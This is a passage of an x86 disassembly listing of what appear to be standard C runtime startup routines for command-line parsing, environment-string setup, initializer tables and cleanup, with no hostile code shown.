  405c25:	83 c4 0c             	add    $0xc,%esp
  405c28:	89 35 a8 70 41 00    	mov    %esi,0x4170a8
  405c2e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  405c31:	85 c0                	test   %eax,%eax
  405c33:	74 05                	je     0x405c3a
  405c35:	80 38 00             	cmpb   $0x0,(%eax)
  405c38:	75 05                	jne    0x405c3f
  405c3a:	8b c6                	mov    %esi,%eax
  405c3c:	89 75 f0             	mov    %esi,-0x10(%ebp)
  405c3f:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  405c42:	89 7d fc             	mov    %edi,-0x4(%ebp)
  405c45:	51                   	push   %ecx
  405c46:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405c49:	89 7d f4             	mov    %edi,-0xc(%ebp)
  405c4c:	51                   	push   %ecx
  405c4d:	57                   	push   %edi
  405c4e:	57                   	push   %edi
  405c4f:	50                   	push   %eax
  405c50:	e8 b0 00 00 00       	call   0x405d05
  405c55:	6a 01                	push   $0x1
  405c57:	ff 75 f4             	push   -0xc(%ebp)
  405c5a:	ff 75 fc             	push   -0x4(%ebp)
  405c5d:	e8 17 02 00 00       	call   0x405e79
  405c62:	8b f0                	mov    %eax,%esi
  405c64:	83 c4 20             	add    $0x20,%esp
  405c67:	85 f6                	test   %esi,%esi
  405c69:	75 0c                	jne    0x405c77
  405c6b:	e8 4b 18 00 00       	call   0x4074bb
  405c70:	6a 0c                	push   $0xc
  405c72:	5f                   	pop    %edi
  405c73:	89 38                	mov    %edi,(%eax)
  405c75:	eb 32                	jmp    0x405ca9
  405c77:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405c7a:	50                   	push   %eax
  405c7b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405c7e:	50                   	push   %eax
  405c7f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405c82:	8d 04 86             	lea    (%esi,%eax,4),%eax
  405c85:	50                   	push   %eax
  405c86:	56                   	push   %esi
  405c87:	ff 75 f0             	push   -0x10(%ebp)
  405c8a:	e8 76 00 00 00       	call   0x405d05
  405c8f:	83 c4 14             	add    $0x14,%esp
  405c92:	83 fb 01             	cmp    $0x1,%ebx
  405c95:	75 16                	jne    0x405cad
  405c97:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405c9a:	48                   	dec    %eax
  405c9b:	a3 ac 70 41 00       	mov    %eax,0x4170ac
  405ca0:	8b c6                	mov    %esi,%eax
  405ca2:	8b f7                	mov    %edi,%esi
  405ca4:	a3 b0 70 41 00       	mov    %eax,0x4170b0
  405ca9:	8b df                	mov    %edi,%ebx
  405cab:	eb 4a                	jmp    0x405cf7
  405cad:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405cb0:	89 7d f8             	mov    %edi,-0x8(%ebp)
  405cb3:	50                   	push   %eax
  405cb4:	56                   	push   %esi
  405cb5:	e8 6e 26 00 00       	call   0x408328
  405cba:	8b d8                	mov    %eax,%ebx
  405cbc:	59                   	pop    %ecx
  405cbd:	59                   	pop    %ecx
  405cbe:	85 db                	test   %ebx,%ebx
  405cc0:	74 05                	je     0x405cc7
  405cc2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405cc5:	eb 26                	jmp    0x405ced
  405cc7:	8b 55 f8             	mov    -0x8(%ebp),%edx
  405cca:	8b cf                	mov    %edi,%ecx
  405ccc:	8b c2                	mov    %edx,%eax
  405cce:	39 3a                	cmp    %edi,(%edx)
  405cd0:	74 08                	je     0x405cda
  405cd2:	8d 40 04             	lea    0x4(%eax),%eax
  405cd5:	41                   	inc    %ecx
  405cd6:	39 38                	cmp    %edi,(%eax)
  405cd8:	75 f8                	jne    0x405cd2
  405cda:	8b c7                	mov    %edi,%eax
  405cdc:	89 0d ac 70 41 00    	mov    %ecx,0x4170ac
  405ce2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405ce5:	8b df                	mov    %edi,%ebx
  405ce7:	89 15 b0 70 41 00    	mov    %edx,0x4170b0
  405ced:	50                   	push   %eax
  405cee:	e8 d4 1d 00 00       	call   0x407ac7
  405cf3:	59                   	pop    %ecx
  405cf4:	89 7d f8             	mov    %edi,-0x8(%ebp)
  405cf7:	56                   	push   %esi
  405cf8:	e8 ca 1d 00 00       	call   0x407ac7
  405cfd:	59                   	pop    %ecx
  405cfe:	8b c3                	mov    %ebx,%eax
  405d00:	5f                   	pop    %edi
  405d01:	5e                   	pop    %esi
  405d02:	5b                   	pop    %ebx
  405d03:	c9                   	leave
  405d04:	c3                   	ret
  405d05:	8b ff                	mov    %edi,%edi
  405d07:	55                   	push   %ebp
  405d08:	8b ec                	mov    %esp,%ebp
  405d0a:	51                   	push   %ecx
  405d0b:	8b 45 14             	mov    0x14(%ebp),%eax
  405d0e:	53                   	push   %ebx
  405d0f:	8b 5d 18             	mov    0x18(%ebp),%ebx
  405d12:	56                   	push   %esi
  405d13:	8b 75 10             	mov    0x10(%ebp),%esi
  405d16:	57                   	push   %edi
  405d17:	83 23 00             	andl   $0x0,(%ebx)
  405d1a:	8b 7d 08             	mov    0x8(%ebp),%edi
  405d1d:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  405d23:	8b 45 0c             	mov    0xc(%ebp),%eax
  405d26:	85 c0                	test   %eax,%eax
  405d28:	74 08                	je     0x405d32
  405d2a:	89 30                	mov    %esi,(%eax)
  405d2c:	83 c0 04             	add    $0x4,%eax
  405d2f:	89 45 0c             	mov    %eax,0xc(%ebp)
  405d32:	32 c9                	xor    %cl,%cl
  405d34:	88 4d ff             	mov    %cl,-0x1(%ebp)
  405d37:	80 3f 22             	cmpb   $0x22,(%edi)
  405d3a:	75 0d                	jne    0x405d49
  405d3c:	84 c9                	test   %cl,%cl
  405d3e:	b0 22                	mov    $0x22,%al
  405d40:	0f 94 c1             	sete   %cl
  405d43:	47                   	inc    %edi
  405d44:	88 4d ff             	mov    %cl,-0x1(%ebp)
  405d47:	eb 35                	jmp    0x405d7e
  405d49:	ff 03                	incl   (%ebx)
  405d4b:	85 f6                	test   %esi,%esi
  405d4d:	74 05                	je     0x405d54
  405d4f:	8a 07                	mov    (%edi),%al
  405d51:	88 06                	mov    %al,(%esi)
  405d53:	46                   	inc    %esi
  405d54:	8a 07                	mov    (%edi),%al
  405d56:	47                   	inc    %edi
  405d57:	88 45 fe             	mov    %al,-0x2(%ebp)
  405d5a:	0f be c0             	movsbl %al,%eax
  405d5d:	50                   	push   %eax
  405d5e:	e8 b1 2f 00 00       	call   0x408d14
  405d63:	59                   	pop    %ecx
  405d64:	85 c0                	test   %eax,%eax
  405d66:	74 0c                	je     0x405d74
  405d68:	ff 03                	incl   (%ebx)
  405d6a:	85 f6                	test   %esi,%esi
  405d6c:	74 05                	je     0x405d73
  405d6e:	8a 07                	mov    (%edi),%al
  405d70:	88 06                	mov    %al,(%esi)
  405d72:	46                   	inc    %esi
  405d73:	47                   	inc    %edi
  405d74:	8a 45 fe             	mov    -0x2(%ebp),%al
  405d77:	84 c0                	test   %al,%al
  405d79:	74 19                	je     0x405d94
  405d7b:	8a 4d ff             	mov    -0x1(%ebp),%cl
  405d7e:	84 c9                	test   %cl,%cl
  405d80:	75 b5                	jne    0x405d37
  405d82:	3c 20                	cmp    $0x20,%al
  405d84:	74 04                	je     0x405d8a
  405d86:	3c 09                	cmp    $0x9,%al
  405d88:	75 ad                	jne    0x405d37
  405d8a:	85 f6                	test   %esi,%esi
  405d8c:	74 07                	je     0x405d95
  405d8e:	c6 46 ff 00          	movb   $0x0,-0x1(%esi)
  405d92:	eb 01                	jmp    0x405d95
  405d94:	4f                   	dec    %edi
  405d95:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  405d99:	8a 07                	mov    (%edi),%al
  405d9b:	84 c0                	test   %al,%al
  405d9d:	0f 84 c2 00 00 00    	je     0x405e65
  405da3:	3c 20                	cmp    $0x20,%al
  405da5:	74 04                	je     0x405dab
  405da7:	3c 09                	cmp    $0x9,%al
  405da9:	75 05                	jne    0x405db0
  405dab:	47                   	inc    %edi
  405dac:	8a 07                	mov    (%edi),%al
  405dae:	eb f3                	jmp    0x405da3
  405db0:	84 c0                	test   %al,%al
  405db2:	0f 84 ad 00 00 00    	je     0x405e65
  405db8:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405dbb:	85 c9                	test   %ecx,%ecx
  405dbd:	74 08                	je     0x405dc7
  405dbf:	89 31                	mov    %esi,(%ecx)
  405dc1:	83 c1 04             	add    $0x4,%ecx
  405dc4:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  405dc7:	8b 45 14             	mov    0x14(%ebp),%eax
  405dca:	ff 00                	incl   (%eax)
  405dcc:	33 d2                	xor    %edx,%edx
  405dce:	42                   	inc    %edx
  405dcf:	33 c0                	xor    %eax,%eax
  405dd1:	eb 02                	jmp    0x405dd5
  405dd3:	47                   	inc    %edi
  405dd4:	40                   	inc    %eax
  405dd5:	8a 0f                	mov    (%edi),%cl
  405dd7:	80 f9 5c             	cmp    $0x5c,%cl
  405dda:	74 f7                	je     0x405dd3
  405ddc:	80 f9 22             	cmp    $0x22,%cl
  405ddf:	75 2e                	jne    0x405e0f
  405de1:	a8 01                	test   $0x1,%al
  405de3:	75 1b                	jne    0x405e00
  405de5:	8a 4d ff             	mov    -0x1(%ebp),%cl
  405de8:	84 c9                	test   %cl,%cl
  405dea:	74 0c                	je     0x405df8
  405dec:	80 7f 01 22          	cmpb   $0x22,0x1(%edi)
  405df0:	75 03                	jne    0x405df5
  405df2:	47                   	inc    %edi
  405df3:	eb 0b                	jmp    0x405e00
  405df5:	8a 4d ff             	mov    -0x1(%ebp),%cl
  405df8:	33 d2                	xor    %edx,%edx
  405dfa:	84 c9                	test   %cl,%cl
  405dfc:	0f 94 45 ff          	sete   -0x1(%ebp)
  405e00:	d1 e8                	shr    $1,%eax
  405e02:	eb 0b                	jmp    0x405e0f
  405e04:	48                   	dec    %eax
  405e05:	85 f6                	test   %esi,%esi
  405e07:	74 04                	je     0x405e0d
  405e09:	c6 06 5c             	movb   $0x5c,(%esi)
  405e0c:	46                   	inc    %esi
  405e0d:	ff 03                	incl   (%ebx)
  405e0f:	85 c0                	test   %eax,%eax
  405e11:	75 f1                	jne    0x405e04
  405e13:	8a 07                	mov    (%edi),%al
  405e15:	84 c0                	test   %al,%al
  405e17:	74 3d                	je     0x405e56
  405e19:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  405e1d:	75 08                	jne    0x405e27
  405e1f:	3c 20                	cmp    $0x20,%al
  405e21:	74 33                	je     0x405e56
  405e23:	3c 09                	cmp    $0x9,%al
  405e25:	74 2f                	je     0x405e56
  405e27:	85 d2                	test   %edx,%edx
  405e29:	74 25                	je     0x405e50
  405e2b:	85 f6                	test   %esi,%esi
  405e2d:	74 05                	je     0x405e34
  405e2f:	88 06                	mov    %al,(%esi)
  405e31:	46                   	inc    %esi
  405e32:	8a 07                	mov    (%edi),%al
  405e34:	0f be c0             	movsbl %al,%eax
  405e37:	50                   	push   %eax
  405e38:	e8 d7 2e 00 00       	call   0x408d14
  405e3d:	59                   	pop    %ecx
  405e3e:	85 c0                	test   %eax,%eax
  405e40:	74 0c                	je     0x405e4e
  405e42:	47                   	inc    %edi
  405e43:	ff 03                	incl   (%ebx)
  405e45:	85 f6                	test   %esi,%esi
  405e47:	74 05                	je     0x405e4e
  405e49:	8a 07                	mov    (%edi),%al
  405e4b:	88 06                	mov    %al,(%esi)
  405e4d:	46                   	inc    %esi
  405e4e:	ff 03                	incl   (%ebx)
  405e50:	47                   	inc    %edi
  405e51:	e9 76 ff ff ff       	jmp    0x405dcc
  405e56:	85 f6                	test   %esi,%esi
  405e58:	74 04                	je     0x405e5e
  405e5a:	c6 06 00             	movb   $0x0,(%esi)
  405e5d:	46                   	inc    %esi
  405e5e:	ff 03                	incl   (%ebx)
  405e60:	e9 34 ff ff ff       	jmp    0x405d99
  405e65:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405e68:	5f                   	pop    %edi
  405e69:	5e                   	pop    %esi
  405e6a:	5b                   	pop    %ebx
  405e6b:	85 c9                	test   %ecx,%ecx
  405e6d:	74 03                	je     0x405e72
  405e6f:	83 21 00             	andl   $0x0,(%ecx)
  405e72:	8b 45 14             	mov    0x14(%ebp),%eax
  405e75:	ff 00                	incl   (%eax)
  405e77:	c9                   	leave
  405e78:	c3                   	ret
  405e79:	8b ff                	mov    %edi,%edi
  405e7b:	55                   	push   %ebp
  405e7c:	8b ec                	mov    %esp,%ebp
  405e7e:	56                   	push   %esi
  405e7f:	8b 75 08             	mov    0x8(%ebp),%esi
  405e82:	81 fe ff ff ff 3f    	cmp    $0x3fffffff,%esi
  405e88:	73 39                	jae    0x405ec3
  405e8a:	83 c8 ff             	or     $0xffffffff,%eax
  405e8d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405e90:	33 d2                	xor    %edx,%edx
  405e92:	f7 75 10             	divl   0x10(%ebp)
  405e95:	3b c8                	cmp    %eax,%ecx
  405e97:	73 2a                	jae    0x405ec3
  405e99:	0f af 4d 10          	imul   0x10(%ebp),%ecx
  405e9d:	c1 e6 02             	shl    $0x2,%esi
  405ea0:	8b c6                	mov    %esi,%eax
  405ea2:	f7 d0                	not    %eax
  405ea4:	3b c1                	cmp    %ecx,%eax
  405ea6:	76 1b                	jbe    0x405ec3
  405ea8:	8d 04 0e             	lea    (%esi,%ecx,1),%eax
  405eab:	6a 01                	push   $0x1
  405ead:	50                   	push   %eax
  405eae:	e8 b7 1b 00 00       	call   0x407a6a
  405eb3:	6a 00                	push   $0x0
  405eb5:	8b f0                	mov    %eax,%esi
  405eb7:	e8 0b 1c 00 00       	call   0x407ac7
  405ebc:	83 c4 0c             	add    $0xc,%esp
  405ebf:	8b c6                	mov    %esi,%eax
  405ec1:	eb 02                	jmp    0x405ec5
  405ec3:	33 c0                	xor    %eax,%eax
  405ec5:	5e                   	pop    %esi
  405ec6:	5d                   	pop    %ebp
  405ec7:	c3                   	ret
  405ec8:	8b ff                	mov    %edi,%edi
  405eca:	55                   	push   %ebp
  405ecb:	8b ec                	mov    %esp,%ebp
  405ecd:	5d                   	pop    %ebp
  405ece:	e9 fc fc ff ff       	jmp    0x405bcf
  405ed3:	83 3d 18 6e 41 00 00 	cmpl   $0x0,0x416e18
  405eda:	74 03                	je     0x405edf
  405edc:	33 c0                	xor    %eax,%eax
  405ede:	c3                   	ret
  405edf:	56                   	push   %esi
  405ee0:	57                   	push   %edi
  405ee1:	e8 08 2b 00 00       	call   0x4089ee
  405ee6:	e8 c4 2f 00 00       	call   0x408eaf
  405eeb:	8b f0                	mov    %eax,%esi
  405eed:	85 f6                	test   %esi,%esi
  405eef:	75 05                	jne    0x405ef6
  405ef1:	83 cf ff             	or     $0xffffffff,%edi
  405ef4:	eb 24                	jmp    0x405f1a
  405ef6:	56                   	push   %esi
  405ef7:	e8 2a 00 00 00       	call   0x405f26
  405efc:	59                   	pop    %ecx
  405efd:	85 c0                	test   %eax,%eax
  405eff:	75 05                	jne    0x405f06
  405f01:	83 cf ff             	or     $0xffffffff,%edi
  405f04:	eb 0c                	jmp    0x405f12
  405f06:	a3 24 6e 41 00       	mov    %eax,0x416e24
  405f0b:	33 ff                	xor    %edi,%edi
  405f0d:	a3 18 6e 41 00       	mov    %eax,0x416e18
  405f12:	6a 00                	push   $0x0
  405f14:	e8 ae 1b 00 00       	call   0x407ac7
  405f19:	59                   	pop    %ecx
  405f1a:	56                   	push   %esi
  405f1b:	e8 a7 1b 00 00       	call   0x407ac7
  405f20:	59                   	pop    %ecx
  405f21:	8b c7                	mov    %edi,%eax
  405f23:	5f                   	pop    %edi
  405f24:	5e                   	pop    %esi
  405f25:	c3                   	ret
  405f26:	8b ff                	mov    %edi,%edi
  405f28:	55                   	push   %ebp
  405f29:	8b ec                	mov    %esp,%ebp
  405f2b:	51                   	push   %ecx
  405f2c:	51                   	push   %ecx
  405f2d:	53                   	push   %ebx
  405f2e:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405f31:	33 d2                	xor    %edx,%edx
  405f33:	56                   	push   %esi
  405f34:	57                   	push   %edi
  405f35:	8b f3                	mov    %ebx,%esi
  405f37:	8a 03                	mov    (%ebx),%al
  405f39:	eb 18                	jmp    0x405f53
  405f3b:	3c 3d                	cmp    $0x3d,%al
  405f3d:	74 01                	je     0x405f40
  405f3f:	42                   	inc    %edx
  405f40:	8b ce                	mov    %esi,%ecx
  405f42:	8d 79 01             	lea    0x1(%ecx),%edi
  405f45:	8a 01                	mov    (%ecx),%al
  405f47:	41                   	inc    %ecx
  405f48:	84 c0                	test   %al,%al
  405f4a:	75 f9                	jne    0x405f45
  405f4c:	2b cf                	sub    %edi,%ecx
  405f4e:	46                   	inc    %esi
  405f4f:	03 f1                	add    %ecx,%esi
  405f51:	8a 06                	mov    (%esi),%al
  405f53:	84 c0                	test   %al,%al
  405f55:	75 e4                	jne    0x405f3b
  405f57:	8d 42 01             	lea    0x1(%edx),%eax
  405f5a:	6a 04                	push   $0x4
  405f5c:	50                   	push   %eax
  405f5d:	e8 08 1b 00 00       	call   0x407a6a
  405f62:	8b f8                	mov    %eax,%edi
  405f64:	59                   	pop    %ecx
  405f65:	59                   	pop    %ecx
  405f66:	85 ff                	test   %edi,%edi
  405f68:	74 6e                	je     0x405fd8
  405f6a:	89 7d fc             	mov    %edi,-0x4(%ebp)
  405f6d:	eb 52                	jmp    0x405fc1
  405f6f:	8b cb                	mov    %ebx,%ecx
  405f71:	8d 71 01             	lea    0x1(%ecx),%esi
  405f74:	8a 01                	mov    (%ecx),%al
  405f76:	41                   	inc    %ecx
  405f77:	84 c0                	test   %al,%al
  405f79:	75 f9                	jne    0x405f74
  405f7b:	2b ce                	sub    %esi,%ecx
  405f7d:	8d 41 01             	lea    0x1(%ecx),%eax
  405f80:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405f83:	80 fa 3d             	cmp    $0x3d,%dl
  405f86:	74 37                	je     0x405fbf
  405f88:	6a 01                	push   $0x1
  405f8a:	50                   	push   %eax
  405f8b:	e8 da 1a 00 00       	call   0x407a6a
  405f90:	8b f0                	mov    %eax,%esi
  405f92:	59                   	pop    %ecx
  405f93:	59                   	pop    %ecx
  405f94:	85 f6                	test   %esi,%esi
  405f96:	74 31                	je     0x405fc9
  405f98:	53                   	push   %ebx
  405f99:	ff 75 f8             	push   -0x8(%ebp)
  405f9c:	56                   	push   %esi
  405f9d:	e8 c1 0b 00 00       	call   0x406b63
  405fa2:	83 c4 0c             	add    $0xc,%esp
  405fa5:	85 c0                	test   %eax,%eax
  405fa7:	75 40                	jne    0x405fe9
  405fa9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405fac:	6a 00                	push   $0x0
  405fae:	89 30                	mov    %esi,(%eax)
  405fb0:	83 c0 04             	add    $0x4,%eax
  405fb3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405fb6:	e8 0c 1b 00 00       	call   0x407ac7
  405fbb:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405fbe:	59                   	pop    %ecx
  405fbf:	03 d8                	add    %eax,%ebx
  405fc1:	8a 13                	mov    (%ebx),%dl
  405fc3:	84 d2                	test   %dl,%dl
  405fc5:	75 a8                	jne    0x405f6f
  405fc7:	eb 11                	jmp    0x405fda
  405fc9:	57                   	push   %edi
  405fca:	e8 27 00 00 00       	call   0x405ff6
  405fcf:	6a 00                	push   $0x0
  405fd1:	e8 f1 1a 00 00       	call   0x407ac7
  405fd6:	59                   	pop    %ecx
  405fd7:	59                   	pop    %ecx
  405fd8:	33 ff                	xor    %edi,%edi
  405fda:	6a 00                	push   $0x0
  405fdc:	e8 e6 1a 00 00       	call   0x407ac7
  405fe1:	59                   	pop    %ecx
  405fe2:	8b c7                	mov    %edi,%eax
  405fe4:	5f                   	pop    %edi
  405fe5:	5e                   	pop    %esi
  405fe6:	5b                   	pop    %ebx
  405fe7:	c9                   	leave
  405fe8:	c3                   	ret
  405fe9:	33 c0                	xor    %eax,%eax
  405feb:	50                   	push   %eax
  405fec:	50                   	push   %eax
  405fed:	50                   	push   %eax
  405fee:	50                   	push   %eax
  405fef:	50                   	push   %eax
  405ff0:	e8 19 14 00 00       	call   0x40740e
  405ff5:	cc                   	int3
  405ff6:	8b ff                	mov    %edi,%edi
  405ff8:	55                   	push   %ebp
  405ff9:	8b ec                	mov    %esp,%ebp
  405ffb:	56                   	push   %esi
  405ffc:	8b 75 08             	mov    0x8(%ebp),%esi
  405fff:	85 f6                	test   %esi,%esi
  406001:	74 1f                	je     0x406022
  406003:	8b 06                	mov    (%esi),%eax
  406005:	57                   	push   %edi
  406006:	8b fe                	mov    %esi,%edi
  406008:	eb 0c                	jmp    0x406016
  40600a:	50                   	push   %eax
  40600b:	e8 b7 1a 00 00       	call   0x407ac7
  406010:	8d 7f 04             	lea    0x4(%edi),%edi
  406013:	8b 07                	mov    (%edi),%eax
  406015:	59                   	pop    %ecx
  406016:	85 c0                	test   %eax,%eax
  406018:	75 f0                	jne    0x40600a
  40601a:	56                   	push   %esi
  40601b:	e8 a7 1a 00 00       	call   0x407ac7
  406020:	59                   	pop    %ecx
  406021:	5f                   	pop    %edi
  406022:	5e                   	pop    %esi
  406023:	5d                   	pop    %ebp
  406024:	c3                   	ret
  406025:	8b ff                	mov    %edi,%edi
  406027:	55                   	push   %ebp
  406028:	8b ec                	mov    %esp,%ebp
  40602a:	56                   	push   %esi
  40602b:	8b f1                	mov    %ecx,%esi
  40602d:	57                   	push   %edi
  40602e:	8d 7e 04             	lea    0x4(%esi),%edi
  406031:	eb 11                	jmp    0x406044
  406033:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406036:	56                   	push   %esi
  406037:	ff 15 24 f2 40 00    	call   *0x40f224
  40603d:	ff 55 08             	call   *0x8(%ebp)
  406040:	59                   	pop    %ecx
  406041:	83 c6 04             	add    $0x4,%esi
  406044:	3b f7                	cmp    %edi,%esi
  406046:	75 eb                	jne    0x406033
  406048:	5f                   	pop    %edi
  406049:	5e                   	pop    %esi
  40604a:	5d                   	pop    %ebp
  40604b:	c2 04 00             	ret    $0x4
  40604e:	8b ff                	mov    %edi,%edi
  406050:	55                   	push   %ebp
  406051:	8b ec                	mov    %esp,%ebp
  406053:	8b 45 08             	mov    0x8(%ebp),%eax
  406056:	8b 00                	mov    (%eax),%eax
  406058:	3b 05 24 6e 41 00    	cmp    0x416e24,%eax
  40605e:	74 07                	je     0x406067
  406060:	50                   	push   %eax
  406061:	e8 90 ff ff ff       	call   0x405ff6
  406066:	59                   	pop    %ecx
  406067:	5d                   	pop    %ebp
  406068:	c3                   	ret
  406069:	8b ff                	mov    %edi,%edi
  40606b:	55                   	push   %ebp
  40606c:	8b ec                	mov    %esp,%ebp
  40606e:	8b 45 08             	mov    0x8(%ebp),%eax
  406071:	8b 00                	mov    (%eax),%eax
  406073:	3b 05 20 6e 41 00    	cmp    0x416e20,%eax
  406079:	74 07                	je     0x406082
  40607b:	50                   	push   %eax
  40607c:	e8 75 ff ff ff       	call   0x405ff6
  406081:	59                   	pop    %ecx
  406082:	5d                   	pop    %ebp
  406083:	c3                   	ret
  406084:	68 4e 60 40 00       	push   $0x40604e
  406089:	b9 18 6e 41 00       	mov    $0x416e18,%ecx
  40608e:	e8 92 ff ff ff       	call   0x406025
  406093:	68 69 60 40 00       	push   $0x406069
  406098:	b9 1c 6e 41 00       	mov    $0x416e1c,%ecx
  40609d:	e8 83 ff ff ff       	call   0x406025
  4060a2:	ff 35 24 6e 41 00    	push   0x416e24
  4060a8:	e8 49 ff ff ff       	call   0x405ff6
  4060ad:	ff 35 20 6e 41 00    	push   0x416e20
  4060b3:	e8 3e ff ff ff       	call   0x405ff6
  4060b8:	59                   	pop    %ecx
  4060b9:	59                   	pop    %ecx
  4060ba:	c3                   	ret
  4060bb:	e9 13 fe ff ff       	jmp    0x405ed3
  4060c0:	8b ff                	mov    %edi,%edi
  4060c2:	53                   	push   %ebx
  4060c3:	56                   	push   %esi
  4060c4:	e8 25 29 00 00       	call   0x4089ee
  4060c9:	8b 35 b8 70 41 00    	mov    0x4170b8,%esi
  4060cf:	85 f6                	test   %esi,%esi
  4060d1:	75 05                	jne    0x4060d8
  4060d3:	be 28 6e 41 00       	mov    $0x416e28,%esi
  4060d8:	32 db                	xor    %bl,%bl
  4060da:	8a 06                	mov    (%esi),%al
  4060dc:	3c 20                	cmp    $0x20,%al
  4060de:	77 08                	ja     0x4060e8
  4060e0:	84 c0                	test   %al,%al
  4060e2:	74 2a                	je     0x40610e
  4060e4:	84 db                	test   %bl,%bl
  4060e6:	74 1b                	je     0x406103
  4060e8:	3c 22                	cmp    $0x22,%al
  4060ea:	75 05                	jne    0x4060f1
  4060ec:	84 db                	test   %bl,%bl
  4060ee:	0f 94 c3             	sete   %bl
  4060f1:	0f b6 c0             	movzbl %al,%eax
  4060f4:	50                   	push   %eax
  4060f5:	e8 1a 2c 00 00       	call   0x408d14
  4060fa:	59                   	pop    %ecx
  4060fb:	85 c0                	test   %eax,%eax
  4060fd:	74 01                	je     0x406100
  4060ff:	46                   	inc    %esi
  406100:	46                   	inc    %esi
  406101:	eb d7                	jmp    0x4060da
  406103:	3c 20                	cmp    $0x20,%al
  406105:	77 07                	ja     0x40610e
  406107:	46                   	inc    %esi
  406108:	8a 06                	mov    (%esi),%al
  40610a:	84 c0                	test   %al,%al
  40610c:	75 f5                	jne    0x406103
  40610e:	8b c6                	mov    %esi,%eax
  406110:	5e                   	pop    %esi
  406111:	5b                   	pop    %ebx
  406112:	c3                   	ret
  406113:	8b ff                	mov    %edi,%edi
  406115:	55                   	push   %ebp
  406116:	8b ec                	mov    %esp,%ebp
  406118:	51                   	push   %ecx
  406119:	8b 45 0c             	mov    0xc(%ebp),%eax
  40611c:	53                   	push   %ebx
  40611d:	56                   	push   %esi
  40611e:	8b 75 08             	mov    0x8(%ebp),%esi
  406121:	2b c6                	sub    %esi,%eax
  406123:	83 c0 03             	add    $0x3,%eax
  406126:	57                   	push   %edi
  406127:	33 ff                	xor    %edi,%edi
  406129:	c1 e8 02             	shr    $0x2,%eax
  40612c:	39 75 0c             	cmp    %esi,0xc(%ebp)
  40612f:	1b db                	sbb    %ebx,%ebx
  406131:	f7 d3                	not    %ebx
  406133:	23 d8                	and    %eax,%ebx
  406135:	74 1c                	je     0x406153
  406137:	8b 06                	mov    (%esi),%eax
  406139:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40613c:	85 c0                	test   %eax,%eax
  40613e:	74 0b                	je     0x40614b
  406140:	8b c8                	mov    %eax,%ecx
  406142:	ff 15 24 f2 40 00    	call   *0x40f224
  406148:	ff 55 fc             	call   *-0x4(%ebp)
  40614b:	83 c6 04             	add    $0x4,%esi
  40614e:	47                   	inc    %edi
  40614f:	3b fb                	cmp    %ebx,%edi
  406151:	75 e4                	jne    0x406137
  406153:	5f                   	pop    %edi
  406154:	5e                   	pop    %esi
  406155:	5b                   	pop    %ebx
  406156:	c9                   	leave
  406157:	c3                   	ret
  406158:	8b ff                	mov    %edi,%edi
  40615a:	55                   	push   %ebp
  40615b:	8b ec                	mov    %esp,%ebp
  40615d:	56                   	push   %esi
  40615e:	8b 75 08             	mov    0x8(%ebp),%esi
  406161:	57                   	push   %edi
  406162:	eb 17                	jmp    0x40617b
  406164:	8b 3e                	mov    (%esi),%edi
  406166:	85 ff                	test   %edi,%edi
  406168:	74 0e                	je     0x406178
  40616a:	8b cf                	mov    %edi,%ecx
  40616c:	ff 15 24 f2 40 00    	call   *0x40f224
  406172:	ff d7                	call   *%edi
  406174:	85 c0                	test   %eax,%eax
  406176:	75 0a                	jne    0x406182
  406178:	83 c6 04             	add    $0x4,%esi
  40617b:	3b 75 0c             	cmp    0xc(%ebp),%esi
  40617e:	75 e4                	jne    0x406164
  406180:	33 c0                	xor    %eax,%eax
  406182:	5f                   	pop    %edi
  406183:	5e                   	pop    %esi
  406184:	5d                   	pop    %ebp
  406185:	c3                   	ret
  406186:	6a 08                	push   $0x8
  406188:	68 f8 48 41 00       	push   $0x4148f8
  40618d:	e8 5e e0 ff ff       	call   0x4041f0
  406192:	8b 45 08             	mov    0x8(%ebp),%eax
  406195:	ff 30                	push   (%eax)
  406197:	e8 21 18 00 00       	call   0x4079bd
  40619c:	59                   	pop    %ecx
  40619d:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4061a1:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4061a4:	e8 2a 00 00 00       	call   0x4061d3
  4061a9:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4061b0:	e8 12 00 00 00       	call   0x4061c7
  4061b5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4061b8:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4061bf:	59                   	pop    %ecx
  4061c0:	5f                   	pop    %edi
  4061c1:	5e                   	pop    %esi
  4061c2:	5b                   	pop    %ebx
  4061c3:	c9                   	leave
  4061c4:	c2 0c 00             	ret    $0xc
  4061c7:	8b 45 10             	mov    0x10(%ebp),%eax
  4061ca:	ff 30                	push   (%eax)
  4061cc:	e8 34 18 00 00       	call   0x407a05
  4061d1:	59                   	pop    %ecx
  4061d2:	c3                   	ret
  4061d3:	6a 08                	push   $0x8
  4061d5:	68 d8 48 41 00       	push   $0x4148d8
  4061da:	e8 11 e0 ff ff       	call   0x4041f0
  4061df:	8b f1                	mov    %ecx,%esi
  4061e1:	80 3d 34 6e 41 00 00 	cmpb   $0x0,0x416e34
  4061e8:	0f 85 96 00 00 00    	jne    0x406284
  4061ee:	33 c0                	xor    %eax,%eax
  4061f0:	40                   	inc    %eax
  4061f1:	b9 2c 6e 41 00       	mov    $0x416e2c,%ecx
